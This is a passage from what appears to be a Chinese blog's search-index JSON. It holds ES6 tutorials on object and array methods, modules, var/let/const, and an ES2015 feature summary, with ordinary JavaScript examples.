或字符串，也不管是否可枚举\n\n上述遍历，都遵守同样的属性遍历的次序规则：\n\n首先遍历所有数值键，按照数值升序排列\n其次遍历所有字符串键，按照加入时间升序排列\n最后遍历所有 Symbol 键，按照加入时间升序排\n\nReflect.ownKeys(&#123; [Symbol()]:0, b:0, 10:0, 2:0, a:0 &#125;)// [&#x27;2&#x27;, &#x27;10&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, Symbol()]\n\n六、对象新增的方法关于对象新增的方法，分别有以下：\n\nObject.is()\nObject.assign()\nObject.getOwnPropertyDescriptors()\nObject.setPrototypeOf()，Object.getPrototypeOf()\nObject.keys()，Object.values()，Object.entries()\nObject.fromEntries()\n\nObject.is()严格判断两个值是否相等，与严格比较运算符（&#x3D;&#x3D;&#x3D;）的行为基本一致，不同之处只有两个：一是+0不等于-0，二是NaN等于自身\n+0 === -0 //trueNaN === NaN // falseObject.is(+0, -0) // falseObject.is(NaN, NaN) // true\n\nObject.assign()Object.assign()`方法用于对象的合并，将源对象`source`的所有可枚举属性，复制到目标对象`target\n\nObject.assign()方法的第一个参数是目标对象，后面的参数都是源对象\nconst target = &#123; a: 1, b: 1 &#125;;const source1 = &#123; b: 2, c: 2 &#125;;const source2 = &#123; c: 3 &#125;;Object.assign(target, source1, source2);target // &#123;a:1, b:2, c:3&#125;\n\n注意：Object.assign()方法是浅拷贝，遇到同名属性会进行替换\nObject.getOwnPropertyDescriptors()返回指定对象所有自身属性（非继承属性）的描述对象\nconst obj = &#123;  foo: 123,  get bar() &#123; return &#x27;abc&#x27; &#125;&#125;;Object.getOwnPropertyDescriptors(obj)// &#123; foo://    &#123; value: 123,//      writable: true,//      enumerable: true,//      configurable: true &#125;,//   bar://    &#123; get: [Function: get bar],//      set: undefined,//      enumerable: true,//      configurable: true &#125; &#125;\n\nObject.setPrototypeOf()Object.setPrototypeOf方法用来设置一个对象的原型对象\nObject.setPrototypeOf(object, prototype)// 用法const o = Object.setPrototypeOf(&#123;&#125;, null);\n\nObject.getPrototypeOf()用于读取一个对象的原型对象\nObject.getPrototypeOf(obj);\n\nObject.keys()返回自身的（不含继承的）所有可遍历（enumerable）属性的键名的数组\nvar obj = &#123; foo: &#x27;bar&#x27;, baz: 42 &#125;;Object.keys(obj)// [&quot;foo&quot;, &quot;baz&quot;]\n\nObject.values()返回自身的（不含继承的）所有可遍历（enumerable）属性的键对应值的数组\nconst obj = &#123; foo: &#x27;bar&#x27;, baz: 42 &#125;;Object.values(obj)// [&quot;bar&quot;, 42]\n\nObject.entries()返回一个对象自身的（不含继承的）所有可遍历（enumerable）属性的键值对的数组\nconst obj = &#123; foo: &#x27;bar&#x27;, baz: 42 &#125;;Object.entries(obj)// [ [&quot;foo&quot;, &quot;bar&quot;], [&quot;baz&quot;, 42] ]\n\nObject.fromEntries()用于将一个键值对数组转为对象\nObject.fromEntries([  [&#x27;foo&#x27;, &#x27;bar&#x27;],  [&#x27;baz&#x27;, 42]])// &#123; foo: &quot;bar&quot;, baz: 42 &#125;","categories":["前端"],"tags":["es6"]},{"title":"es6数组扩展","url":"/2018/03/30/html+css+js+ts/4-es6-%E6%95%B0%E7%BB%84%E6%89%A9%E5%B1%95/","content":"一、扩展运算符的应用ES6通过扩展元素符...，好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列\nconsole.log(...[1, 2, 3])// 1 2 3console.log(1, ...[2, 3, 4], 5)// 1 2 3 4 5[...document.querySelectorAll(&#x27;div&#x27;)]// [&lt;div&gt;, &lt;div&gt;, &lt;div&gt;]\n\n主要用于函数调用的时候，将一个数组变为参数序列\nfunction push(array, ...items) &#123;  array.push(...items);&#125;function add(x, y) &#123;  return x + y;&#125;const numbers = [4, 38];add(...numbers) // 42\n\n可以将某些数据结构转为数组\n[...document.querySelectorAll(&#x27;div&#x27;)]\n\n能够更简单实现数组复制\nconst a1 = [1, 2];const [...a2] = a1;// [1,2]\n\n数组的合并也更为简洁了\nconst arr1 = [&#x27;a&#x27;, &#x27;b&#x27;];const arr2 = [&#x27;c&#x27;];const arr3 = [&#x27;d&#x27;, &#x27;e&#x27;];[...arr1, ...arr2, ...arr3]// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; ]\n\n注意：通过扩展运算符实现的是浅拷贝，修改了引用指向的值，会同步反映到新数组\n下面看个例子就清楚多了\nconst arr1 = [&#x27;a&#x27;, &#x27;b&#x27;,[1,2]];const arr2 = [&#x27;c&#x27;];const arr3  = [...arr1,...arr2]arr[1][0] = 9999 // 修改arr1里面数组成员值console.log(arr[3]) // 影响到arr3,[&#x27;a&#x27;,&#x27;b&#x27;,[9999,2],&#x27;c&#x27;]\n\n扩展运算符可以与解构赋值结合起来，用于生成数组\nconst [first, ...rest] = [1, 2, 3, 4, 5];first // 1rest  // [2, 3, 4, 5]const [first, ...rest] = [];first // undefinedrest  // []const [first, ...rest] = [&quot;foo&quot;];first  // &quot;foo&quot;rest   // []\n\n如果将扩展运算符用于数组赋值，只能放在参数的最后一位，否则会报错\nconst [...butLast, last] = [1, 2, 3, 4, 5];// 报错const [first, ...middle, last] = [1, 2, 3, 4, 5];// 报错\n\n\n\n可以将字符串转为真正的数组\n[...&#x27;hello&#x27;]// [ &quot;h&quot;, &quot;e&quot;, &quot;l&quot;, &quot;l&quot;, &quot;o&quot; ]\n\n定义了遍历器（Iterator）接口的对象，都可以用扩展运算符转为真正的数组\nlet nodeList = document.querySelectorAll(&#x27;div&#x27;);let array = [...nodeList];let map = new Map([  [1, &#x27;one&#x27;],  [2, &#x27;two&#x27;],  [3, &#x27;three&#x27;],]);let arr = [...map.keys()]; // [1, 2, 3]\n\n如果对没有 Iterator 接口的对象，使用扩展运算符，将会报错\nconst obj = &#123;a: 1, b: 2&#125;;let arr = [...obj]; // TypeError: Cannot spread non-iterable object\n\n二、构造函数新增的方法关于构造函数，数组新增的方法有如下：\n\nArray.from()\nArray.of()\n\nArray.from()将两类对象转为真正的数组：类似数组的对象和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map）\nlet arrayLike = &#123;    &#x27;0&#x27;: &#x27;a&#x27;,    &#x27;1&#x27;: &#x27;b&#x27;,    &#x27;2&#x27;: &#x27;c&#x27;,    length: 3&#125;;let arr2 = Array.from(arrayLike); // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]\n\n还可以接受第二个参数，用来对每个元素进行处理，将处理后的值放入返回的数组\nArray.from([1, 2, 3], (x) =&gt; x * x)// [1, 4, 9]\n\nArray.of()用于将一组值，转换为数组\nArray.of(3, 11, 8) // [3,11,8]\n\n没有参数的时候，返回一个空数组\n当参数只有一个的时候，实际上是指定数组的长度\n参数个数不少于 2 个时，Array()才会返回由参数组成的新数组\nArray() // []Array(3) // [, , ,]Array(3, 11, 8) // [3, 11, 8]\n\n三、实例对象新增的方法关于数组实例对象新增的方法有如下：\n\ncopyWithin()\nfind()、findIndex()\nfill()\nentries()，keys()，values()\nincludes()\nflat()，flatMap()\n\ncopyWithin()将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组\n参数如下：\n\ntarget（必需）：从该位置开始替换数据。如果为负值，表示倒数。\nstart（可选）：从该位置开始读取数据，默认为 0。如果为负值，表示从末尾开始计算。\nend（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示从末尾开始计算。\n\n[1, 2, 3, 4, 5].copyWithin(0, 3) // 将从 3 号位直到数组结束的成员（4 和 5），复制到从 0 号位开始的位置，结果覆盖了原来的 1 和 2// [4, 5, 3, 4, 5] \n\nfind()、findIndex()find()用于找出第一个符合条件的数组成员\n参数是一个回调函数，接受三个参数依次为当前的值、当前的位置和原数组\n[1, 5, 10, 15].find(function(value, index, arr) &#123;  return value &gt; 9;&#125;) // 10\n\nfindIndex`返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回`-1[1, 5, 10, 15].findIndex(function(value, index, arr) &#123;  return value &gt; 9;&#125;) // 2\n\n这两个方法都可以接受第二个参数，用来绑定回调函数的this对象。\nfunction f(v)&#123;  return v &gt; this.age;&#125;let person = &#123;name: &#x27;John&#x27;, age: 20&#125;;[10, 12, 26, 15].find(f, person);    // 26\n\nfill()使用给定值，填充一个数组\n[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;].fill(7)// [7, 7, 7]new Array(3).fill(7)// [7, 7, 7]\n\n还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置\n[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;].fill(7, 1, 2)// [&#x27;a&#x27;, 7, &#x27;c&#x27;]\n\n注意，如果填充的类型为对象，则是浅拷贝\nentries()，keys()，values()keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历\nor (let index of [&#x27;a&#x27;, &#x27;b&#x27;].keys()) &#123;  console.log(index);&#125;// 0// 1for (let elem of [&#x27;a&#x27;, &#x27;b&#x27;].values()) &#123;  console.log(elem);&#125;// &#x27;a&#x27;// &#x27;b&#x27;for (let [index, elem] of [&#x27;a&#x27;, &#x27;b&#x27;].entries()) &#123;  console.log(index, elem);&#125;// 0 &quot;a&quot;\n\nincludes()用于判断数组是否包含给定的值\n[1, 2, 3].includes(2)     // true[1, 2, 3].includes(4)     // false[1, 2, NaN].includes(NaN) // true\n\n方法的第二个参数表示搜索的起始位置，默认为0\n参数为负数则表示倒数的位置\n[1, 2, 3].includes(3, 3);  // false[1, 2, 3].includes(3, -1); // true\n\nflat()，flatMap()将数组扁平化处理，返回一个新数组，对原数据没有影响\n[1, 2, [3, 4]].flat()// [1, 2, 3, 4]\n\nflat()默认只会“拉平”一层，如果想要“拉平”多层的嵌套数组，可以将flat()方法的参数写成一个整数，表示想要拉平的层数，默认为1\n[1, 2, [3, [4, 5]]].flat()// [1, 2, 3, [4, 5]][1, 2, [3, [4, 5]]].flat(2)// [1, 2, 3, 4, 5]\n\nflatMap()方法对原数组的每个成员执行一个函数相当于执行Array.prototype.map()，然后对返回值组成的数组执行flat()方法。该方法返回一个新数组，不改变原数组\n// 相当于 [[2, 4], [3, 6], [4, 8]].flat()[2, 3, 4].flatMap((x) =&gt; [x, x * 2])// [2, 4, 3, 6, 4, 8]\n\nflatMap()`方法还可以有第二个参数，用来绑定遍历函数里面的`this\n\n四、数组的空位数组的空位指，数组的某一个位置没有任何值\nES6 则是明确将空位转为undefined，包括Array.from、扩展运算符、copyWithin()、fill()、entries()、keys()、values()、find()和findIndex()\n建议大家在日常书写中，避免出现空位\n五、排序稳定性将sort()默认设置为稳定的排序算法\nconst arr = [  &#x27;peach&#x27;,  &#x27;straw&#x27;,  &#x27;apple&#x27;,  &#x27;spork&#x27;];const stableSorting = (s1, s2) =&gt; &#123;  if (s1[0] &lt; s2[0]) return -1;  return 1;&#125;;arr.sort(stableSorting)// [&quot;apple&quot;, &quot;peach&quot;, &quot;straw&quot;, &quot;spork&quot;]\n\n排序结果中，straw在spork的前面，跟原始顺序一致\n","categories":["前端"],"tags":["es6"]},{"title":"ES6 module","url":"/2018/04/02/html+css+js+ts/4-module/","content":"一、介绍模块，（Module），是能够单独命名并独立地完成一定功能的程序语句的集合（即程序代码和数据结构的集合体）。\n两个基本的特征：外部特征和内部特征\n\n外部特征是指模块跟外部环境联系的接口（即其他模块或程序调用该模块的方式，包括有输入输出参数、引用的全局变量）和模块的功能\n内部特征是指模块的内部环境具有的特点（即该模块的局部数据和程序代码）\n\n为什么需要模块化\n代码抽象\n代码封装\n代码复用\n依赖管理\n\n如果没有模块化，我们代码会怎样？\n\n变量和方法不容易维护，容易污染全局作用域\n加载资源的方式通过script标签从上到下。\n依赖的环境主观逻辑偏重，代码较多就会比较复杂。\n大型项目资源难以维护，特别是多人合作的情况下，资源的引入会让人奔溃\n\n因此，需要一种将JavaScript程序模块化的机制，如\n\nCommonJs (典型代表：node.js早期)\nAMD (典型代表：require.js)\nCMD (典型代表：sea.js)\n\nAMDAsynchronous ModuleDefinition（AMD），异步模块定义，采用异步方式加载模块。所有依赖模块的语句，都定义在一个回调函数中，等到模块加载完成之后，这个回调函数才会运行\n代表库为require.js\n/** main.js 入口文件/主模块 **/// 首先用config()指定各模块路径和引用名require.config(&#123;  baseUrl: &quot;js/lib&quot;,  paths: &#123;    &quot;jquery&quot;: &quot;jquery.min&quot;,  //实际路径为js/lib/jquery.min.js    &quot;underscore&quot;: &quot;underscore.min&quot;,  &#125;&#125;);// 执行基本操作require([&quot;jquery&quot;,&quot;underscore&quot;],function($,_)&#123;  // some code here&#125;);\n\nCommonJsCommonJS 是一套 Javascript 模块规范，用于服务端\n// a.jsmodule.exports=&#123; foo , bar&#125;// b.jsconst &#123; foo,bar &#125; = require(&#x27;./a.js&#x27;)\n\n其有如下特点：\n\n所有代码都运行在模块作用域，不会污染全局作用域\n模块是同步加载的，即只有加载完成，才能执行后面的操作\n模块在首次执行后就会缓存，再次加载只返回缓存结果，如果想要再次执行，可清除缓存\nrequire返回的值是被输出的值的拷贝，模块内部的变化也不会影响这个值\n\n既然存在了AMD以及CommonJs机制，ES6的Module又有什么不一样？\nES6 在语言标准的层面上，实现了Module，即模块功能，完全可以取代 CommonJS和 AMD规范，成为浏览器和服务器通用的模块解决方案\nCommonJS 和AMD 模块，都只能在运行时确定这些东西。比如，CommonJS模块就是对象，输入时必须查找对象属性\n// CommonJS模块let &#123; stat, exists, readfile &#125; = require(&#x27;fs&#x27;);// 等同于let _fs = require(&#x27;fs&#x27;);let stat = _fs.stat;let exists = _fs.exists;let readfile = _fs.readfile;\n\nES6设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量\n// ES6模块import &#123; stat, exists, readFile &#125; from &#x27;fs&#x27;;\n\n上述代码，只加载3个方法，其他方法不加载，即 ES6 可以在编译时就完成模块加载\n由于编译加载，使得静态分析成为可能。包括现在流行的typeScript也是依靠静态分析实现功能\n二、使用ES6模块内部自动采用了严格模式，这里就不展开严格模式的限制，毕竟这是ES5之前就已经规定好\n模块功能主要由两个命令构成：\n\nexport：用于规定模块的对外接口\nimport：用于输入其他模块提供的功能\n\nexport一个模块就是一个独立的文件，该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量\n// profile.jsexport var firstName = &#x27;Michael&#x27;;export var lastName = &#x27;Jackson&#x27;;export var year = 1958;或 // 建议使用下面写法，这样能瞬间确定输出了哪些变量var firstName = &#x27;Michael&#x27;;var lastName = &#x27;Jackson&#x27;;var year = 1958;export &#123; firstName, lastName, year &#125;;\n\n输出函数或类\nexport function multiply(x, y) &#123;  return x * y;&#125;;\n\n通过as可以进行输出变量的重命名\nfunction v1() &#123; ... &#125;function v2() &#123; ... &#125;export &#123;  v1 as streamV1,  v2 as streamV2,  v2 as streamLatestVersion&#125;;\n\nimport使用export命令定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块\n// main.jsimport &#123; firstName, lastName, year &#125; from &#x27;./profile.js&#x27;;function setName(element) &#123;  element.textContent = firstName + &#x27; &#x27; + lastName;&#125;\n\n同样如果想要输入变量起别名，通过as关键字\nimport &#123; lastName as surname &#125; from &#x27;./profile.js&#x27;;\n\n当加载整个模块的时候，需要用到星号*\n// circle.jsexport function area(radius) &#123;  return Math.PI * radius * radius;&#125;export function circumference(radius) &#123;  return 2 * Math.PI * radius;&#125;// main.jsimport * as circle from &#x27;./circle&#x27;;console.log(circle)   // &#123;area:area,circumference:circumference&#125;\n\n输入的变量都是只读的，不允许修改，但是如果是对象，允许修改属性\nimport &#123;a&#125; from &#x27;./xxx.js&#x27;a.foo = &#x27;hello&#x27;; // 合法操作a = &#123;&#125;; // Syntax Error : &#x27;a&#x27; is read-only;\n\n不过建议即使能修改，但我们不建议。因为修改之后，我们很难差错\nimport后面我们常接着from关键字，from指定模块文件的位置，可以是相对路径，也可以是绝对路径\nimport &#123; a &#125; from &#x27;./a&#x27;;\n\n如果只有一个模块名，需要有配置文件，告诉引擎模块的位置\nimport &#123; myMethod &#125; from &#x27;util&#x27;;\n\n在编译阶段，import会提升到整个模块的头部，首先执行\nfoo();import &#123; foo &#125; from &#x27;my_module&#x27;;\n\n多次重复执行同样的导入，只会执行一次\nimport &#x27;lodash&#x27;;import &#x27;lodash&#x27;;\n\n上面的情况，大家都能看到用户在导入模块的时候，需要知道加载的变量名和函数，否则无法加载\n如果不需要知道变量名或函数就完成加载，就要用到export default命令，为模块指定默认输出\n// export-default.jsexport default function () &#123;    console.log(&#x27;foo&#x27;);&#125;\n\n加载该模块的时候，import命令可以为该函数指定任意名字\n// import-default.jsimport customName from &#x27;./export-default&#x27;;customName(); // &#x27;foo&#x27;\n\n动态加载允许您仅在需要时动态加载模块，而不必预先加载所有模块，这存在明显的性能优势\n这个新功能允许您将import()作为函数调用，将其作为参数传递给模块的路径。 它返回一个 promise，它用一个模块对象来实现，让你可以访问该对象的导出\nimport(&#x27;/modules/myModule.mjs&#x27;)  .then((module) =&gt; &#123;    // Do something with the module.  &#125;);\n\n复合写法如果在一个模块之中，先输入后输出同一个模块，import语句可以与export语句写在一起\nexport &#123; foo, bar &#125; from &#x27;my_module&#x27;;// 可以简单理解为import &#123; foo, bar &#125; from &#x27;my_module&#x27;;export &#123; foo, bar &#125;;\n\n同理能够搭配as、*搭配使用\n三、使用场景如今，ES6模块化已经深入我们日常项目开发中，像vue、react项目搭建项目，组件化开发处处可见，其也是依赖模块化实现\nvue组件\n&lt;template&gt;  &lt;div class=&quot;App&quot;&gt;      组件化开发 ---- 模块化  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;HelloWorld&#x27;,  props: &#123;    msg: String  &#125;&#125;&lt;/script&gt;\n\nreact组件\nfunction App() &#123;  return (    &lt;div className=&quot;App&quot;&gt;\t\t组件化开发 ---- 模块化    &lt;/div&gt;  );&#125;export default App;\n\n包括完成一些复杂应用的时候，我们也可以拆分成各个模块\n","categories":["前端"],"tags":["es6"]},{"title":"es6 var、let、const","url":"/2018/04/15/html+css+js+ts/4-var%E3%80%81let%E3%80%81const/","content":"一、var在ES5中，顶层对象的属性和全局变量是等价的，用var声明的变量既是全局变量，也是顶层变量\n注意：顶层对象，在浏览器环境指的是window对象，在 Node 指的是global对象\nvar a = 10;console.log(window.a) // 10\n\n使用var声明的变量存在变量提升的情况\nconsole.log(a) // undefinedvar a = 20\n\n在编译阶段，编译器会将其变成以下执行\nvar aconsole.log(a)a = 20\n\n使用var，我们能够对一个变量进行多次声明，后面声明的变量会覆盖前面的变量声明\nvar a = 20 var a = 30console.log(a) // 30\n\n在函数中使用使用var声明变量时候，该变量是局部的\nvar a = 20function change()&#123;    var a = 30&#125;change()console.log(a) // 20 \n\n而如果在函数内不使用var，该变量是全局的\nvar a = 20function change()&#123;   a = 30&#125;change()console.log(a) // 30 \n\n二、letlet是ES6新增的命令，用来声明变量\n用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效\n&#123;    let a = 20&#125;console.log(a) // ReferenceError: a is not defined.\n\n不存在变量提升\nconsole.log(a) // 报错ReferenceErrorlet a = 2\n\n这表示在声明它之前，变量a是不存在的，这时如果用到它，就会抛出一个错误\n只要块级作用域内存在let命令，这个区域就不再受外部影响\nvar a = 123if (true) &#123;    a = &#x27;abc&#x27; // ReferenceError    let a;&#125;\n\n使用let声明变量前，该变量都不可用，也就是大家常说的“暂时性死区”\n最后，let不允许在相同作用域中重复声明\nlet a = 20let a = 30// Uncaught SyntaxError: Identifier &#x27;a&#x27; has already been declared\n\n注意的是相同作用域，下面这种情况是不会报错的\nlet a = 20&#123;    let a = 30&#125;\n\n因此，我们不能在函数内部重新声明参数\nfunction func(arg) &#123;  let arg;&#125;func()// Uncaught SyntaxError: Identifier &#x27;arg&#x27; has already been declared\n\n三、constconst声明一个只读的常量，一旦声明，常量的值就不能改变\nconst a = 1a = 3// TypeError: Assignment to constant variable.\n\n这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值\nconst a;// SyntaxError: Missing initializer in const declaration\n\n如果之前用var或let声明过变量，再用const声明同样会报错\nvar a = 20let b = 20const a = 30const b = 30// 都会报错\n\nconst实际上保证的并不是变量的值不得改动，而是变量指向的那个内存地址所保存的数据不得改动\n对于简单类型的数据，值就保存在变量指向的那个内存地址，因此等同于常量\n对于复杂类型的数据，变量指向的内存地址，保存的只是一个指向实际数据的指针，const只能保证这个指针是固定的，并不能确保改变量的结构不变\nconst foo = &#123;&#125;;// 为 foo 添加一个属性，可以成功foo.prop = 123;foo.prop // 123// 将 foo 指向另一个对象，就会报错foo = &#123;&#125;; // TypeError: &quot;foo&quot; is read-only\n\n其它情况，const与let一致\n四、区别var、let、const三者区别可以围绕下面五点展开：\n\n变量提升\n暂时性死区\n块级作用域\n重复声明\n修改声明的变量\n使用\n\n变量提升var`声明的变量存在变量提升，即变量可以在声明之前调用，值为`undefined\n\nlet和const不存在变量提升，即它们所声明的变量一定要在声明后使用，否则报错\n// varconsole.log(a)  // undefinedvar a = 10// let console.log(b)  // Cannot access &#x27;b&#x27; before initializationlet b = 10// constconsole.log(c)  // Cannot access &#x27;c&#x27; before initializationconst c = 10\n\n暂时性死区var不存在暂时性死区\nlet和const存在暂时性死区，只有等到声明变量的那一行代码出现，才可以获取和使用该变量\n// varconsole.log(a)  // undefinedvar a = 10// letconsole.log(b)  // Cannot access &#x27;b&#x27; before initializationlet b = 10// constconsole.log(c)  // Cannot access &#x27;c&#x27; before initializationconst c = 10\n\n块级作用域var不存在块级作用域\nlet和const存在块级作用域\n// var&#123;    var a = 20&#125;console.log(a)  // 20// let&#123;    let b = 20&#125;console.log(b)  // Uncaught ReferenceError: b is not defined// const&#123;    const c = 20&#125;console.log(c)  // Uncaught ReferenceError: c is not defined\n\n重复声明var允许重复声明变量\nlet和const在同一作用域不允许重复声明变量\n// varvar a = 10var a = 20 // 20// letlet b = 10let b = 20 // Identifier &#x27;b&#x27; has already been declared// constconst c = 10const c = 20 // Identifier &#x27;c&#x27; has already been declared\n\n修改声明的变量var和let可以\nconst声明一个只读的常量。一旦声明，常量的值就不能改变\n// varvar a = 10a = 20console.log(a)  // 20//letlet b = 10b = 20console.log(b)  // 20// constconst c = 10c = 20console.log(c) // Uncaught TypeError: Assignment to constant variable\n\n使用能用const的情况尽量使用const，其他情况下大多数使用let，避免使用var\n","categories":["前端"],"tags":["es6"]},{"title":"ES 2015~2019","url":"/2018/03/23/html+css+js+ts/4-es6/","content":"\n一、前言\nES6是ECMA为JavaScript制定的第6个标准版本\n标准委员会最终决定，标准在每年6月正式发布并作为当年的正式版本，接下来的时间里就在此版本的基础上进行改动，直到下一年6月草案就自然变成新一年的版本，这样一来就无需以前的版本号，只要用年份标记即可。ECMAscript 2015是在2015年6月发布ES6的第一个版本。以此类推，ECMAscript 2016是ES6的第二个版本、 ECMAscript 2017是ES6的第三个版本。ES6既是一个历史名词也是一个泛指，含义是5.1版本以后的JavaScript下一代标准，目前涵盖了ES2015、ES2016、ES2017、ES2018、ES2019\n\n\n所以有些文章上提到的ES7(实质上是ES2016)、ES8(实质上是ES2017)、ES9(实质上是ES2018)、ES10(实质上是ES2019)，实质上都是一些不规范的概念。从ES1到ES6，每个标准都是花了好几年甚至十多年才制定下来，你一个ES6到ES7，ES7到ES8，才用了一年，按照这样的定义下去，那不是很快就ES20了。用正确的概念来说ES6目前涵盖了ES2015、ES2016、ES2017、ES2018、ES2019\n\n\n二、ES2015\n声明\nconst命令：声明常量\nlet命令：声明变量\n\n\n作用\n\n作用域\n\n全局作用域\n函数作用域：function() &#123;&#125;\n块级作用域：&#123;&#125;\n\n作用范围\n\nvar命令在全局代码中执行\nconst命令和let命令只能在代码块中执行\n\n赋值使用\n\nconst命令声明常量后必须立马赋值\nlet命令声明变量后可立马赋值或使用时赋值\n\n\n声明方法：var、const、let、function、class、import\n\n重点难点\n\n不允许重复声明\n未定义就使用会报错：const命令和let命令不存在变量提升\n暂时性死区：在代码块内使用let命令声明变量之前，该变量都不可用\n\n解构赋值\n字符串解构：const [a, b, c, d, e] = &quot;hello&quot;\n数值解构：const &#123; toString: s &#125; = 123\n布尔值解构：const &#123; toString: b &#125; = true\n\n对象解构\n\n形式：const &#123; x, y &#125; = &#123; x: 1, y: 2 &#125;\n默认：const &#123; x, y = 2 &#125; = &#123; x: 1 &#125;\n改名：const &#123; x, y: z &#125; = &#123; x: 1, y: 2 &#125;\n\n数组解构\n\n规则：数据结构具有Iterator接口可采用数组形式的解构赋值\n形式：const [x, y] = [1, 2]\n默认：const [x, y = 2] = [1]\n\n函数参数解构\n\n数组解构：function Func([x = 0, y = 1]) &#123;&#125;\n对象解构：function Func(&#123; x = 0, y = 1 &#125; = &#123;&#125;) &#123;&#125;\n\n应用场景\n\n交换变量值：[x, y] = [y, x]\n返回函数多个值：const [x, y, z] = Func()\n定义函数参数：Func([1, 2])\n提取JSON数据：const &#123; name, version &#125; = packageJson\n定义函数参数默认值：function Func(&#123; x = 1, y = 2 &#125; = &#123;&#125;) &#123;&#125;\n遍历Map结构：for (let [k, v] of Map) &#123;&#125;\n输入模块指定属性和方法：const &#123; readFile, writeFile &#125; = require(&quot;fs&quot;)\n\n重点难点\n\n匹配模式：只要等号两边的模式相同，左边的变量就会被赋予对应的值\n解构赋值规则：只要等号右边的值不是对象或数组，就先将其转为对象\n解构默认值生效条件：属性值严格等于undefined\n解构遵循匹配模式\n解构不成功时变量的值等于undefined\nundefined和null无法转为对象，因此无法进行解构\n\n字符串扩展\nUnicode表示法：大括号包含表示Unicode字符(\\u&#123;0xXX&#125;或\\u&#123;0XXX&#125;)\n字符串遍历：可通过for-of遍历字符串\n字符串模板：可单行可多行可插入变量的增强版字符串\n标签模板：函数参数的特殊调用\nString.raw()：返回把字符串所有变量替换且对斜杠进行转义的结果\nString.fromCodePoint()：返回码点对应字符\ncodePointAt()：返回字符对应码点(String.fromCodePoint()的逆操作)\nnormalize()：把字符的不同表示方法统一为同样形式，返回新字符串(Unicode正规化)\nrepeat()：把字符串重复n次，返回新字符串\nmatchAll()：返回正则表达式在字符串的所有匹配\nincludes()：是否存在指定字符串\nstartsWith()：是否存在字符串头部指定字符串\nendsWith()：是否存在字符串尾部指定字符串\n\n重点难点\n\n以上扩展方法均可作用于由4个字节储存的Unicode字符上\n\n数值扩展\n二进制表示法：0b或0B开头表示二进制(0bXX或0BXX)\n八进制表示法：0o或0O开头表示二进制(0oXX或0OXX)\nNumber.EPSILON：数值最小精度\nNumber.MIN_SAFE_INTEGER：最小安全数值(-2^53)\nNumber.MAX_SAFE_INTEGER：最大安全数值(2^53)\nNumber.parseInt()：返回转换值的整数部分\nNumber.parseFloat()：返回转换值的浮点数部分\nNumber.isFinite()：是否为有限数值\nNumber.isNaN()：是否为NaN\nNumber.isInteger()：是否为整数\nNumber.isSafeInteger()：是否在数值安全范围内\nMath.trunc()：返回数值整数部分\nMath.sign()：返回数值类型(正数1、负数-1、零0)\nMath.cbrt()：返回数值立方根\nMath.clz32()：返回数值的32位无符号整数形式\nMath.imul()：返回两个数值相乘\nMath.fround()：返回数值的32位单精度浮点数形式\nMath.hypot()：返回所有数值平方和的平方根\nMath.expm1()：返回e^n - 1\nMath.log1p()：返回1 + n的自然对数(Math.log(1 + n))\nMath.log10()：返回以10为底的n的对数\nMath.log2()：返回以2为底的n的对数\nMath.sinh()：返回n的双曲正弦\nMath.cosh()：返回n的双曲余弦\nMath.tanh()：返回n的双曲正切\nMath.asinh()：返回n的反双曲正弦\nMath.acosh()：返回n的反双曲余弦\nMath.atanh()：返回n的反双曲正切\n\n对象扩展\n简洁表示法：直接写入变量和函数作为对象的属性和方法(&#123; prop, method() &#123;&#125; &#125;)\n属性名表达式：字面量定义对象时使用[]定义键([prop]，不能与上同时使用)\n方法的name属性：返回方法函数名\n取值函数(getter)和存值函数(setter)：get/set函数名(属性的描述对象在get和set上)\nbind返回的函数：bound 函数名\nFunction构造函数返回的函数实例：anonymous\n\n\n属性的可枚举性和遍历：描述对象的enumerable\nsuper关键字：指向当前对象的原型对象(只能用在对象的简写方法中method() &#123;&#125;)\nObject.is()：对比两值是否相等\nObject.assign()：合并对象(浅拷贝)，返回原对象\nObject.getPrototypeOf()：返回对象的原型对象\nObject.setPrototypeOf()：设置对象的原型对象\n__proto__：返回或设置对象的原型对象\n\n属性遍历\n\n描述：自身、可继承、可枚举、非枚举、Symbol\n遍历\nfor-in：遍历对象自身可继承可枚举属性\nObject.keys()：返回对象自身可枚举属性的键组成的数组\nObject.getOwnPropertyNames()：返回对象自身可继承可枚举非枚举属性的键组成的数组\nObject.getOwnPropertySymbols()：返回对象Symbol属性的键组成的数组\nReflect.ownKeys()：返回对象自身可继承可枚举非枚举Symbol属性的键组成的数组\n\n\n规则\n首先遍历所有数值键，按照数值升序排列\n其次遍历所有字符串键，按照加入时间升序排列\n最后遍历所有Symbol键，按照加入时间升序排列\n\n\n\n数组扩展\n扩展运算符(...)：转换数组为用逗号分隔的参数序列([...arr]，相当于rest/spread参数的逆运算)\n\nArray.from()\n：转换具有\nIterator\n  接口的数据结构为真正数组，返回新数组  - 类数组对象：包含`length`的对象、`Arguments`对象、`NodeList`对象  - 可遍历对象：`String`、`Set`结构、`Map`结构、`Generator`函数- `Array.of()`：转换一组值为真正数组，返回新数组- `copyWithin()`：把指定位置的成员复制到其他位置，返回原数组- `find()`：返回第一个符合条件的成员- `findIndex()`：返回第一个符合条件的成员索引值- `fill()`：根据指定值填充整个数组，返回原数组- `keys()`：返回以索引值为遍历器的对象- `values()`：返回以属性值为遍历器的对象- `entries()`：返回以索引值和属性值为遍历器的对象- 数组空位：ES6明确将数组空位转为`undefined`(空位处理规不一，建议避免出现)**扩展应用**- 